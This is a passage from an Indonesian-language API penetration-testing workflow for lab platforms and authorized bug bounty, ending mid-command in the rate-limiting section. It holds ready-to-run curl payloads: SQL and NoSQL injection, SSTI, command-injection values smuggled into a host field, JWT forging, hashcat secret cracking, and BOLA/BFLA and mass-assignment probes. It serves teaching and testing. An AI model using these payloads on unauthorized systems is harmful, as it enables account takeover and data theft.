---
id: "30"
title: "🔌 30 — API Security Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "30_api_security_workflow.md"
refs_out: ["19","20","21","22","23","28","29","31","33"]
refs_in: ["04","15","16","27","28","31","33","34","61"]
---

← [File 29: CSRF](/docs/csrf)

# 🔌 30 — API Security Workflow

> **Scope:** HackTheBox, TryHackMe, PortSwigger Academy, dan bug bounty pada target yang memang mengizinkan pengujian.  
> **OS:** Parrot OS XFCE / Debian-based  
> **Level:** Beginner → Intermediate  
> **Goal:** membangun _muscle memory_ API security: discovery → authentication → authorization → input validation → business logic → GraphQL → API-specific attack surface → automation.

---

# 📚 Daftar Isi

- [🔌 0. Fundamentals](#-0-fundamentals)
    
    - [0.1 Apa Itu API Security Testing](#01-apa-itu-api-security-testing)
        
    - [0.2 API Discovery](#02-api-discovery)
        
    - [0.3 Authentication Types di API](#03-authentication-types-di-api)
        
- [🔎 1. Reconnaissance](#-1-reconnaissance)
    
    - [1.1 API Endpoint Discovery](#11-api-endpoint-discovery)
        
    - [1.2 API Documentation Exposure](#12-api-documentation-exposure)
        
    - [1.3 GraphQL Recon](#13-graphql-recon)
        
    - [1.4 API Wordlists](#14-api-wordlists)
        
- [🔐 2. Authentication Testing](#-2-authentication-testing)
    
    - [2.1 API Key Testing](#21-api-key-testing)
        
    - [2.2 JWT in API](#22-jwt-in-api)
        
    - [2.3 OAuth API Testing](#23-oauth-api-testing)
        
    - [2.4 Broken Authentication Patterns](#24-broken-authentication-patterns)
        
- [🚪 3. Authorization Testing](#-3-authorization-testing)
    
    - [3.1 BOLA](#31-bola-broken-object-level-authorization)
        
    - [3.2 BFLA](#32-bfla-broken-function-level-authorization)
        
    - [3.3 Mass Assignment](#33-mass-assignment)
        
    - [3.4 Excessive Data Exposure](#34-excessive-data-exposure)
        
- [🧪 4. Input Validation](#-4-input-validation)
    
    - [4.1 Injection via API](#41-injection-via-api)
        
    - [4.2 Parameter Pollution](#42-parameter-pollution)
        
    - [4.3 Type Juggling](#43-type-juggling)
        
- [⏱️ 5. Rate Limiting & Business Logic](#-5-rate-limiting--business-logic)
    
    - [5.1 Rate Limiting Testing](#51-rate-limiting-testing)
        
    - [5.2 API Versioning Abuse](#52-api-versioning-abuse)
        
    - [5.3 Business Logic via API](#53-business-logic-via-api)
        
- [🕸️ 6. GraphQL Security](#-6-graphql-security)
    
    - [6.1 GraphQL Fundamentals](#61-graphql-fundamentals)
        
    - [6.2 GraphQL Attack Techniques](#62-graphql-attack-techniques)
        
    - [6.3 GraphQL Tools](#63-graphql-tools)
        
- [🌍 7. CORS & API](#-7-cors--api)
    
    - [7.1 CORS Misconfiguration](#71-cors-misconfiguration-di-api)
        
- [⚙️ 8. API-Specific Vulnerabilities](#-8-api-specific-vulnerabilities)
    
    - [8.1 SSRF via API](#81-ssrf-via-api)
        
    - [8.2 File Upload via API](#82-file-upload-via-api)
        
    - [8.3 WebSocket Security](#83-websocket-security)
        
- [🧰 9. Tools & Automation](#-9-tools--automation)
    
    - [9.1 Burp Suite](#91-burp-suite-untuk-api)
        
    - [9.2 curl Cheatsheet](#92-curl-cheatsheet-untuk-api-testing)
        
    - [9.3 api_tester.py](#93-python-script-api_testerpy)
        
    - [9.4 ffuf untuk API Fuzzing](#94-ffuf-untuk-api-fuzzing)
        
- [🌳 10. Decision Tree](#-10-decision-tree)
    
- [🛠️ 11. Common Errors & Troubleshooting](#-11-common-errors--troubleshooting)
    
- [📏 12. Golden Rules](#-12-golden-rules)
    
- [✅ 13. Final Checklist](#-13-final-checklist)
    
- [🔀 14. Cross-Workflow](#-14-cross-workflow)
    
- [🧠 15. One-Line Muscle Memory](#-15-one-line-muscle-memory)
    

---

# 🔌 0. Fundamentals

# 0.1 Apa Itu API Security Testing 🔌

## 📌 Kapan Digunakan

Gunakan workflow ini saat target memiliki:

```text
/api/
/v1/
/graphql
/swagger
/openapi
/mobile API
backend JSON endpoint
WebSocket
SOAP service
```

API Security Testing berfokus pada pertanyaan:

```text
"Apakah API mempercayai client terlalu banyak?"
```

---

## REST vs GraphQL vs SOAP vs gRPC

|API Type|Bentuk|Fokus Pentester|
|---|---|---|
|REST|Endpoint + HTTP method|Auth, BOLA, BFLA, injection, business logic|
|GraphQL|Query ke satu endpoint|Schema exposure, resolver auth, batching, depth|
|SOAP|XML envelope|XML parser, XXE, auth, SOAP actions|
|gRPC|Protobuf/RPC|Auth interceptor, method authorization, metadata, serialization|

---

## Web Biasa vs API

### Web

```text
Browser
   │
   ▼
GET /profile
   │
   ▼
HTML
   │
   ▼
Browser Rendering
```

### API

```text
Client
   │
   ▼
GET /api/v1/profile
   │
   ▼
JSON
   │
   ▼
Client decides what to render
```

API sering lebih mudah diuji karena:

```text
UI layer
  ↓
HTTP request
  ↓
direct endpoint
  ↓
JSON response
```

Pentester dapat berkomunikasi langsung dengan backend tanpa seluruh UI.

---

## API Request Flow

```text
Mobile / SPA / CLI
        │
        ▼
     API Gateway
        │
        ▼
 Authentication
        │
        ▼
 Authorization
        │
        ▼
 Validation
        │
        ▼
 Business Logic
        │
        ▼
 Database / Internal Service
```

Satu request dapat gagal di salah satu layer.

---

# OWASP API Security Top 10 — 2023

|#|Category|Inti Masalah|
|---|---|---|
|API1|Broken Object Level Authorization|User dapat mengakses object yang seharusnya bukan miliknya|
|API2|Broken Authentication|Mekanisme identity/token dapat dibypass atau disalahgunakan|
|API3|Broken Object Property Level Authorization|Property sensitif dapat dibaca/diubah tanpa authorization yang tepat|
|API4|Unrestricted Resource Consumption|API tidak membatasi penggunaan resource secara memadai|
|API5|Broken Function Level Authorization|User dapat menjalankan function yang seharusnya tidak boleh|
|API6|Unrestricted Access to Sensitive Business Flows|Workflow bisnis penting dapat diautomasi/disalahgunakan|
|API7|Server Side Request Forgery|Server menerima input yang menyebabkan request ke destination attacker-controlled|
|API8|Security Misconfiguration|Konfigurasi/API exposure tidak aman|
|API9|Improper Inventory Management|API lama/hidden/versioned tidak dikelola dengan benar|
|API10|Unsafe Consumption of APIs|API mempercayai third-party API secara tidak aman|

> OWASP API Security Top 10 2023 adalah baseline klasifikasi; vulnerability nyata dapat masuk lebih dari satu kategori.

---

## API Testing vs Web App Testing

```text
WEB
Page
 │
 ▼
Form
 │
 ▼
Request
 │
 ▼
Response


API
Endpoint
 │
 ▼
Method
 │
 ▼
Headers
 │
 ▼
Body
 │
 ▼
Object
 │
 ▼
Property
 │
 ▼
Business Logic
```

Mindset API:

```text
Endpoint → Identity → Object → Property → Function → Business Rule
```

---

# 0.2 API Discovery

## 📌 Kapan Digunakan

Sebelum testing vulnerability, bangun inventory endpoint.

Cari dari:

```text
JavaScript
Network traffic
Swagger/OpenAPI
Mobile apps
robots.txt
source code
documentation
Burp history
```

---

## JavaScript

```bash
# Download JavaScript references from a page
curl -s http://TARGET/ |
grep -Eo 'src=["'\''][^"'\'']+\.js'

# Inspect an identified JavaScript file for API-like strings
curl -s http://TARGET/static/app.js |
grep -Eo \
'["'\''](/api/|/v[0-9]+/|/graphql|/auth|/users)[^"'\'']*'
```

Contoh:

```text
/api/v1/users
/api/v1/login
/api/v2/orders
/graphql
```

---

## Network Traffic

Browser:

```text
F12
→ Network
→ Fetch/XHR
```

Cari:

```text
/api/
/graphql
/v1/
/v2/
```

---

## robots.txt

```bash
# Check robots.txt for hidden application paths
curl -i http://TARGET/robots.txt
```

---

## Common Paths

```text
/api
/api/v1
/api/v2
/api/users
/api/auth
/api/login
/api/register
/api/admin
/api/internal
/api/debug
/graphql
/swagger
/swagger-ui
/api-docs
/openapi.json
```

---

## Versioning Patterns

```text
/v1/users
/v2/users
/api/v1/users
/api/v2/users
/internal/users
/private/users
/admin/users
```

---

## Content-Type Clues

|Content-Type|Clue|
|---|---|
|`application/json`|REST/JSON API|
|`application/graphql`|GraphQL|
|`application/xml`|XML REST/SOAP-like|
|`text/xml`|SOAP/XML|
|`application/grpc`|gRPC|
|`multipart/form-data`|File upload/form API|

---

# 0.3 Authentication Types di API

|Type|Dimana|Cara Test|Kelemahan Umum|
|---|---|---|---|
|API Key|Header/query/body|Remove/change/reuse|Exposed key, weak scope|
|Bearer/JWT|`Authorization`|Decode/modify/expiry|Weak validation|
|Basic Auth|`Authorization`|Invalid/default creds|Weak password|
|OAuth 2.0|Bearer token|Scope/redirect/token flow|Misconfiguration|
|mTLS|TLS certificate|Cert enforcement|Weak endpoint separation|
|Cookie|`Cookie` header|CSRF/session tests|Session flaws|
|HMAC|Signature header|Canonicalization/replay|Weak secret/replay|

---

# 🔎 1. Reconnaissance

# 1.1 API Endpoint Discovery

## 📌 Kapan Digunakan

Gunakan saat endpoint API belum diketahui lengkap.

---

## ffuf API Discovery

```bash
# Discover common API paths
ffuf \
  -u http://TARGET/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,307,401,403
```

Jika file berbeda:

```bash
# List available API wordlists
find /usr/share/seclists/Discovery/Web-Content/api \
  -type f -maxdepth 1
```

Contoh:

```text
api/
├── api-endpoints.txt
├── api-endpoints-res.txt
└── common-api-endpoints-mazen160.txt
```

---

## gobuster

```bash
# Enumerate API directories
gobuster dir \
  -u http://TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -s 200,204,301,302,307,401,403
```

---

## JavaScript Recon

```bash
# Search JavaScript for API paths
curl -s http://TARGET/app.js |
grep -Eo \
'[/][A-Za-z0-9_./-]*(api|v1|v2|graphql|auth|user|admin)[A-Za-z0-9_./?=&-]*'
```

Contoh:

```text
/api/v1/profile
/api/v1/orders
/api/v2/admin
/graphql
```

---

## Burp Passive Crawling

Workflow:

```text
Browser
  │
  ▼
Burp Proxy
  │
  ▼
Browse application
  │
  ▼
HTTP History
  │
  ▼
API inventory
```

Cari:

```text
GET
POST
PUT
PATCH
DELETE
```

---

## curl Explore

```bash
# Inspect root endpoint
curl -i http://TARGET/api/

# Inspect a JSON endpoint
curl -i http://TARGET/api/v1/users

# Ask for JSON explicitly
curl -i \
  -H 'Accept: application/json' \
  http://TARGET/api/v1/users
```

---

## Expected Output

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "users": [
    {
      "id": 1,
      "username": "alice"
    }
  ]
}
```

---

# 1.2 API Documentation Exposure

## 📌 Kapan Digunakan

Saat API inventory masih belum lengkap.

---

## Swagger UI

Cari:

```text
/swagger/
/swagger-ui/
/swagger/index.html
```

```bash
# Test common Swagger locations
for p in /swagger/ /swagger-ui/ /swagger/index.html; do
  echo "# Testing $p"
  curl -s -o /dev/null -w "$p -> %{http_code}\n" \
    "http://TARGET$p"
done
```

---

## OpenAPI JSON

```bash
# Test common OpenAPI documents
curl -i http://TARGET/swagger.json
curl -i http://TARGET/openapi.json
curl -i http://TARGET/api-docs
```

---

## OpenAPI YAML

```bash
# Test common OpenAPI YAML locations
curl -i http://TARGET/openapi.yaml
curl -i http://TARGET/swagger.yaml
```

---

## Extract Paths dengan jq

```bash
# Download OpenAPI specification
curl -s http://TARGET/openapi.json -o openapi.json

# Extract API paths
jq -r '.paths | keys[]' openapi.json
```

Expected:

```text
/api/v1/users
/api/v1/orders
/api/v1/admin/users
```

---

## Redoc

```bash
# Check Redoc endpoint
curl -i http://TARGET/redoc/
```

---

## Postman Collection

Cari:

```text
/postman
/collection.json
/docs/postman
```

---

## GraphQL Introspection

Lihat [6.1 GraphQL Fundamentals](#61-graphql-fundamentals).

---

## Exploit Exposed Docs

Exposed docs menjadi masalah ketika mengungkap:

```text
admin endpoints
internal endpoints
debug endpoints
request schemas
hidden parameters
authentication requirements
```

Example:

```text
GET /api/internal/debug
POST /api/admin/reset-password
```

**Documentation exposure bukan vulnerability yang sama dengan unauthorized access.** Selalu uji authorization endpoint yang ditemukan.

---

# 1.3 GraphQL Recon

## 📌 Kapan Digunakan

Saat menemukan:

```text
/graphql
/api/graphql
/v1/graphql
```

---

## Introspection Query

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      name
      kind
    }
  }
}
```

Dengan curl:

```bash
# Send basic GraphQL introspection
curl -s \
  -X POST \
  http://TARGET/graphql \
  -H 'Content-Type: application/json' \
  --data @- <<'EOF'
{
  "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind } } }"
}
EOF
```

Expected:

```json
{
  "data": {
    "__schema": {
      "queryType": {"name": "Query"},
      "mutationType": {"name": "Mutation"},
      "subscriptionType": null
    }
  }
}
```

---

## Schema Dump

```graphql
query FullSchema {
  __schema {
    types {
      name
      kind
      fields {
        name
        args {
          name
          type {
            name
            kind
          }
        }
        type {
          name
          kind
        }
      }
    }
  }
}
```

---

## Query Discovery

Cari:

```text
Query
Mutation
Subscription
```

Contoh:

```text
users
user
orders
products
adminUsers
updateUser
deleteUser
```

---

## InQL

Burp:

```text
Burp
 │
 ▼
Extensions
 │
 ▼
InQL
 │
 ▼
Import/schema introspection
```

Tool membantu membuat query dari schema.

---

## graphql-cop

Gunakan sebagai security audit helper:

```bash
# Clone the audit tool in your lab
git clone https://github.com/dolevf/graphql-cop.git

# Enter the project
cd graphql-cop

# Inspect usage
python3 graphql-cop.py --help
```

CLI dapat berbeda antar version/fork.

---

# 1.4 API Wordlists

## 📌 Kapan Digunakan

Saat melakukan discovery endpoint.

Lokasi utama:

```text
/usr/share/seclists/Discovery/Web-Content/api/
```

Cek:

```bash
# List API-focused SecLists
find /usr/share/seclists/Discovery/Web-Content/api \
  -maxdepth 1 \
  -type f \
  -printf '%f\n'
```

Wordlist umum lain:

```text
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Strategy:

```text
small API list
   ↓
versioned paths
   ↓
parameter discovery
   ↓
JS/API schema
   ↓
targeted fuzzing
```

---

# 🔐 2. Authentication Testing

# 2.1 API Key Testing

## 📌 Kapan Digunakan

Saat API menggunakan:

```http
X-API-Key: ...
```

atau:

```http
Authorization: Api-Key ...
```

---

## Baseline

```bash
# Request using the known lab API key
curl -i \
  'http://TARGET/api/v1/profile' \
  -H 'X-API-Key: LAB_API_KEY'
```

---

## Invalid Key

```bash
# Test an obviously invalid API key
curl -i \
  'http://TARGET/api/v1/profile' \
  -H 'X-API-Key: INVALID_KEY'
```

Expected:

```http
HTTP/1.1 401 Unauthorized
```

---

## No Key

```bash
# Remove the API key completely
curl -i \
  'http://TARGET/api/v1/profile'
```

Compare:

```text
valid → 200
invalid → 401
missing → 401
```

---

## Query Key

```bash
# Test an API key passed in query parameters
curl -i \
  'http://TARGET/api/v1/profile?api_key=LAB_API_KEY'
```

Security issue:

```text
URL
 ↓
logs
 ↓
browser history
 ↓
analytics
```

---

## Body Key

```json
{
  "api_key": "LAB_API_KEY",
  "action": "profile"
}
```

```bash
# Send an API key inside JSON
curl -i \
  -X POST \
  'http://TARGET/api/v1/profile' \
  -H 'Content-Type: application/json' \
  --data '{"api_key":"LAB_API_KEY","action":"profile"}'
```

---

## Cross-Context Key Reuse

Test:

```text
header context
query context
different endpoint
different API version
```

Question:

```text
"Does a key intended for endpoint A
work against endpoint B?"
```

---

## API Key Format Brute Force

Blind brute force is rarely efficient unless format is weak.

Better first inspect:

```text
length
charset
prefix
version
environment
```

Example:

```text
LAB_xxxxxxxxxxxx
prod_xxxxxxxxxxxx
sk_live_...
```

Do not brute-force live third-party API keys.

---

# 2.2 JWT in API

## 📌 Kapan Digunakan

Saat request menggunakan:

```http
Authorization: Bearer eyJ...
```

Cross-reference:

```text
→ [File 28: JWT](/docs/jwt)
```

---

## Decode

```bash
# Decode the JWT header/payload for inspection
python3 - <<'PY' "$TOKEN"
import base64
import json
import sys

token = sys.argv[1]

parts = token.split(".")

if len(parts) != 3:
    raise SystemExit("Invalid JWT format")

for name, value in zip(("HEADER", "PAYLOAD"), parts[:2]):
    value += "=" * (-len(value) % 4)
    decoded = base64.urlsafe_b64decode(value)
    print(name)
    print(json.dumps(json.loads(decoded), indent=2))
PY
```

---

## `alg=none`

Conceptual API test:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Potential forged token should only be tested in an authorized lab.

---

## Weak Secret

```bash
# Save the lab JWT into a file
printf '%s\n' "$TOKEN" > jwt.txt

# Test for a weak JWT HMAC secret
hashcat -m 16500 \
  jwt.txt \
  /usr/share/wordlists/rockyou.txt
```

---

## `kid` Injection

### 📌 Kapan Digunakan

Saat JWT header mengandung:

```json
{
  "alg": "HS256",
  "kid": "..."
}
```

Cari backend behavior:

```text
kid
 │
 ├── filesystem lookup?
 ├── database lookup?
 └── key selection?
```

Contoh modified header concept:

```json
{
  "alg": "HS256",
  "kid": "LAB_KEY"
}
```

Do not assume `kid` is inherently injectable.

---

## Quick JWT Forge Script

```bash
# Install PyJWT for a controlled lab environment
python3 -m pip install PyJWT
```

```bash
# Create a lab token using a deliberately known weak secret
python3 - <<'PY'
import jwt

payload = {
    "sub": "admin",
    "role": "admin"
}

token = jwt.encode(
    payload,
    "lab-secret",
    algorithm="HS256"
)

print(token)
PY
```

Then:

```bash
# Test the generated lab JWT against an authorized endpoint
curl -i \
  'http://TARGET/api/v1/admin' \
  -H "Authorization: Bearer $TOKEN"
```

---

# 2.3 OAuth API Testing

## 📌 Kapan Digunakan

Saat API authentication menggunakan OAuth 2.0/OpenID Connect.

Cari:

```text
/authorize
/token
/callback
/.well-known/openid-configuration
```

---

## Metadata

```bash
# Discover OpenID Connect configuration
curl -s \
  'https://TARGET/.well-known/openid-configuration' |
  jq .
```

Cari:

```text
authorization_endpoint
token_endpoint
jwks_uri
issuer
userinfo_endpoint
```

---

## Token Leakage via Referer

Cari callback:

```text
/callback?code=...
```

Perhatikan apakah authorization code/token masuk ke page yang memuat external resources.

```bash
# Inspect callback headers in a lab
curl -i \
  'https://TARGET/callback?code=LAB_CODE'
```

---

## State

Normal OAuth:

```text
state=RANDOM_SESSION_BOUND_VALUE
```

Test concept:

```text
missing state
wrong state
reused state
cross-session state
```

---

## Redirect URI

```bash
# Inspect an OAuth authorization request
curl -i \
  'https://TARGET/oauth/authorize?client_id=LAB&redirect_uri=https%3A%2F%2FTARGET%2Fcallback&response_type=code&state=LAB_STATE'
```

Test whether exact registered redirect URI enforcement exists.

---

## Scope Abuse

Example:

```text
scope=read
```

Test whether client can request:

```text
scope=admin
scope=write
scope=delete
```

without legitimate authorization.

---

# 2.4 Broken Authentication Patterns

## 📌 Kapan Digunakan

Setelah endpoint inventory selesai.

---

## Missing Authentication

```bash
# Compare unauthenticated access to a sensitive endpoint
curl -i \
  'http://TARGET/api/v1/admin/users'
```

Expected secure:

```http
HTTP/1.1 401 Unauthorized
```

Potential issue:

```http
HTTP/1.1 200 OK
```

---

## Parameter-Based Auth Bypass

Bad design:

```http
GET /api/profile?user_id=10&is_admin=true
```

Test concept:

```bash
# Test whether a client-controlled authorization field changes privilege
curl -i \
  'http://TARGET/api/profile?user_id=10&is_admin=true' \
  -H 'Authorization: Bearer LAB_TOKEN'
```

Client-controlled authorization flags should not decide privilege.

---

## Default Credentials

```bash
# Test known lab credentials against a documented lab API
curl -i \
  -X POST \
  'http://TARGET/api/login' \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":"admin"}'
```

---

# 🚪 3. Authorization Testing

# 3.1 BOLA — Broken Object Level Authorization

## 📌 Kapan Digunakan

BOLA adalah kondisi ketika:

> user authenticated dapat mengakses object milik user lain hanya dengan mengubah object identifier.

Contoh:

```text
GET /api/orders/1001
```

ubah menjadi:

```text
GET /api/orders/1002
```

---

## BOLA vs BFLA

```text
BOLA
"What OBJECT can I access?"

BFLA
"What FUNCTION can I execute?"
```

Contoh:

```text
BOLA:
GET /users/200
```

User A → melihat User B.

BFLA:

```text
POST /admin/users/200/disable
```

Normal user → menjalankan fungsi admin.

---

## Methodology — User A

```text
User A
  │
  ▼
Create object
  │
  ▼
Object ID = 1001
```

Request:

```bash
# Retrieve an object belonging to User A
curl -i \
  'http://TARGET/api/v1/orders/1001' \
  -H 'Authorization: Bearer USER_A_TOKEN'
```

---

## User B

```bash
# Attempt to retrieve User A's object using User B's session
curl -i \
  'http://TARGET/api/v1/orders/1001' \
  -H 'Authorization: Bearer USER_B_TOKEN'
```

Expected secure:

```http
HTTP/1.1 403 Forbidden
```

Potential vulnerable:

```http
HTTP/1.1 200 OK
Content-Type: application/json
```

---

## Modify

```bash
# Test whether User B can modify User A's object
curl -i \
  -X PATCH \
  'http://TARGET/api/v1/orders/1001' \
  -H 'Authorization: Bearer USER_B_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{"quantity":2}'
```

---

## Concrete BOLA Diagram

```text
USER A
 │
 └── Object 1001
        │
        ▼
    Authorized ✅


USER B
 │
 └── Request Object 1001
        │
        ▼
Authorization check
        │
   ┌────┴────┐
  PASS      FAIL
   │          │
   ▼          ▼
BOLA         403
```

---

## Secure vs Vulnerable

### ❌ Vulnerable

```python
@app.get("/orders/<int:order_id>")
def get_order(order_id):
    return Order.query.get(order_id)
```

Masalah:

```text
order_id
   ↓
database
   ↓
no ownership check
```

### ✅ Secure Concept

```python
@app.get("/orders/<int:order_id>")
def get_order(order_id):
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id
    ).first_or_404()

    return order
```

---

## BOLA Decision Tree

```text
Object ID ditemukan
       │
       ▼
User A owns object?
       │
       ▼
Record object ID
       │
       ▼
Switch User B
       │
       ▼
Request same object
       │
 ┌─────┴─────┐
DENIED      ALLOWED
  │             │
  ▼             ▼
Secure       BOLA candidate
```

---

# 3.2 BFLA — Broken Function Level Authorization

## 📌 Kapan Digunakan

Saat normal user dapat memanggil function yang seharusnya hanya tersedia bagi role lain.

---

## Concrete Example

Normal user:

```text
GET /api/profile
```

Admin:

```text
GET /api/admin/users
POST /api/admin/users/create
DELETE /api/admin/users/10
```

BFLA:

```text
Normal User
    │
    ▼
POST /api/admin/users/create
    │
    ▼
200 OK
```

---

## Hidden Endpoint Discovery

```bash
# Discover likely administrative API endpoints
ffuf \
  -u 'http://TARGET/api/FUZZ' \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,401,403
```

---

## Normal User Test

```bash
# Attempt admin function with a normal-user token
curl -i \
  -X POST \
  'http://TARGET/api/admin/users/create' \
  -H 'Authorization: Bearer USER_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{"username":"lab-test"}'
```

Expected secure:

```http
HTTP/1.1 403 Forbidden
```

Potential BFLA:

```http
HTTP/1.1 201 Created
```

---

## HTTP Method Manipulation

```bash
# Test GET behavior
curl -i \
  -X GET \
  'http://TARGET/api/admin/resource' \
  -H 'Authorization: Bearer USER_TOKEN'

# Test POST behavior
curl -i \
  -X POST \
  'http://TARGET/api/admin/resource' \
  -H 'Authorization: Bearer USER_TOKEN'

# Test PUT behavior
curl -i \
  -X PUT \
  'http://TARGET/api/admin/resource' \
  -H 'Authorization: Bearer USER_TOKEN'

# Test PATCH behavior
curl -i \
  -X PATCH \
  'http://TARGET/api/admin/resource' \
  -H 'Authorization: Bearer USER_TOKEN'

# Test DELETE behavior
curl -i \
  -X DELETE \
  'http://TARGET/api/admin/resource' \
  -H 'Authorization: Bearer USER_TOKEN'
```

---

## BFLA Decision Tree

```text
Sensitive Function Found
        │
        ▼
Authenticated Normal User
        │
        ▼
Call admin/privileged function
        │
 ┌──────┴──────┐
403/401       Success
   │             │
   ▼             ▼
Authorized     BFLA candidate
restriction
```

---

# 3.3 Mass Assignment

## 📌 Kapan Digunakan

Saat API menerima JSON object dan backend melakukan automatic object binding.

Contoh expected:

```json
{
  "username": "alice"
}
```

Test candidate:

```json
{
  "username": "alice",
  "role": "admin"
}
```

---

## Hidden Fields dari Response

```bash
# Inspect the full JSON response for undocumented properties
curl -s \
  'http://TARGET/api/v1/profile' \
  -H 'Authorization: Bearer USER_TOKEN' |
  jq .
```

Cari:

```text
role
isAdmin
verified
balance
permissions
```

---

## JSON Example

```json
{
  "username": "alice",
  "role": "admin",
  "verified": true
}
```

---

## Test

```bash
# Test whether undocumented properties are accepted
curl -i \
  -X PATCH \
  'http://TARGET/api/v1/profile' \
  -H 'Authorization: Bearer USER_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{
    "display_name":"Alice",
    "role":"admin",
    "isAdmin":true
  }'
```

Expected secure:

```json
{
  "display_name": "Alice"
}
```

Potential issue:

```json
{
  "display_name": "Alice",
  "role": "admin",
  "isAdmin": true
}
```

dan authorization benar-benar berubah.

---

## Form-data

```bash
# Test undocumented form fields
curl -i \
  -X POST \
  'http://TARGET/api/v1/profile' \
  -H 'Authorization: Bearer USER_TOKEN' \
  -F 'display_name=Alice' \
  -F 'role=admin'
```

---

# 3.4 Excessive Data Exposure

## 📌 Kapan Digunakan

Saat API mengembalikan object yang lebih lengkap daripada yang diperlukan UI.

---

## Compare UI vs API

UI:

```text
username
display_name
avatar
```

API:

```json
{
  "id": 12,
  "username": "alice",
  "password_hash": "...",
  "reset_token": "...",
  "internal_notes": "...",
  "email": "..."
}
```

---

## jq

```bash
# Pretty-print the API response
curl -s \
  'http://TARGET/api/v1/profile' \
  -H 'Authorization: Bearer USER_TOKEN' |
  jq .
```

Cari field sensitif:

```bash
# Search for likely sensitive property names
curl -s \
  'http://TARGET/api/v1/profile' \
  -H 'Authorization: Bearer USER_TOKEN' |
  jq '.. | objects | keys[]' |
  grep -Ei \
  'password|token|secret|key|internal|ssn|credit|reset'
```

---

# 🧪 4. Input Validation

# 4.1 Injection via API

## 📌 Kapan Digunakan

Saat API memasukkan input ke:

```text
SQL
NoSQL
Template Engine
OS command
XML parser
```

---

## SQLi — JSON

```json
{
  "username": "admin' OR '1'='1"
}
```

```bash
# Test a suspected SQL injection parameter in JSON
curl -i \
  -X POST \
  'http://TARGET/api/v1/search' \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin'\'' OR '\''1'\''='\''1"}'
```

---

## SQLi — Query Parameter

```bash
# Test a query parameter for SQL injection behavior
curl -i \
  --get \
  --data-urlencode "id=10'" \
  'http://TARGET/api/v1/item'
```

---

## NoSQL MongoDB

```json
{
  "username": "admin",
  "password": {
    "$ne": null
  }
}
```

```bash
# Test MongoDB operator injection in an authorized lab
curl -i \
  -X POST \
  'http://TARGET/api/login' \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":{"$ne":null}}'
```

---

## SSTI via API

```json
{
  "template": "{{7*7}}"
}
```

```bash
# Test SSTI with a harmless arithmetic expression
curl -i \
  -X POST \
  'http://TARGET/api/render' \
  -H 'Content-Type: application/json' \
  --data '{"template":"{{7*7}}"}'
```

Expected vulnerable behavior:

```text
49
```

Cross-reference:

```text
→ [File 23: SSTI](/docs/ssti)
```

---

## Command Injection

Harmless validation:

```text
$(id)
```

or:

```text
; echo API_TEST
```

```bash
# Test command-injection behavior with a harmless marker
curl -i \
  -X POST \
  'http://TARGET/api/ping' \
  -H 'Content-Type: application/json' \
  --data '{"host":"127.0.0.1; echo API_TEST"}'
```

Expected secure:

```text
host interpreted as data
```

Potential issue:

```text
API_TEST
```

appears as command output.

---

# 4.2 Parameter Pollution

## 📌 Kapan Digunakan

Saat backend dan proxy/application layer dapat memproses duplicate parameter secara berbeda.

---

## Query Pollution

```text
?id=1&id=2
```

```bash
# Send duplicate query parameters
curl -i \
  'http://TARGET/api/item?id=1&id=2'
```

Potential interpretations:

```text
first wins
last wins
array
concatenate
```

---

## JSON Duplicate Keys

```json
{
  "role": "user",
  "role": "admin"
}
```

```bash
# Test duplicate JSON keys in a lab
curl -i \
  -X POST \
  'http://TARGET/api/profile' \
  -H 'Content-Type: application/json' \
  --data '{"role":"user","role":"admin"}'
```

Different parsers may choose:

```text
first
last
error
```

---

## Array vs Scalar

```json
{
  "id": [1, 2]
}
```

```bash
# Test scalar vs array interpretation
curl -i \
  -X POST \
  'http://TARGET/api/item' \
  -H 'Content-Type: application/json' \
  --data '{"id":[1,2]}'
```

---

# 4.3 Type Juggling

## 📌 Kapan Digunakan

Saat API menerima tipe JSON yang fleksibel dan backend menggunakan weak comparison/conversion.

---

## PHP Example

Potentially dangerous:

```php
if ($_POST["admin"] == true) {
    // privilege
}
```

Input:

```json
{
  "admin": "1"
}
```

atau type variations:

```json
{
  "admin": true
}
```

atau:

```json
{
  "admin": 1
}
```

---

## API Tests

```bash
# Boolean representation
curl -i \
  -X POST \
  'http://TARGET/api/profile' \
  -H 'Content-Type: application/json' \
  --data '{"admin":true}'

# Numeric representation
curl -i \
  -X POST \
  'http://TARGET/api/profile' \
  -H 'Content-Type: application/json' \
  --data '{"admin":1}'

# String representation
curl -i \
  -X POST \
  'http://TARGET/api/profile' \
  -H 'Content-Type: application/json' \
  --data '{"admin":"1"}'
```

---

## JavaScript Loose Comparison

Potentially dangerous:

```javascript
if (role == 1) {
    allowAdmin();
}
```

Testing harus berfokus pada behavior actual API, bukan sekadar asumsi bahasa.

---

## Integer Overflow

### 📌 Kapan Digunakan

Saat API menerima quantity/amount/id sebagai integer dan backend/database memiliki batas tertentu.

```bash
# Test a large numeric value in an authorized lab
curl -i \
  -X POST \
  'http://TARGET/api/cart' \
  -H 'Content-Type: application/json' \
  --data '{"quantity":2147483647}'
```

Kemudian test behavior di sekitar batas:

```text
2147483646
2147483647
2147483648
```

Jangan langsung melakukan huge-number fuzzing tanpa memahami impact.

---

# ⏱️ 5. Rate Limiting & Business Logic

# 5.1 Rate Limiting Testing

## 📌 Kapan Digunakan

Pada:

```text
login
OTP
password reset
coupon
search
expensive API operations
```

---

## Baseline

```bash
# Send one request and record the response
curl -i \
  -s \
  -o /dev/null \
  -w 'code=%{http_code} time=%{time_total}\n' \
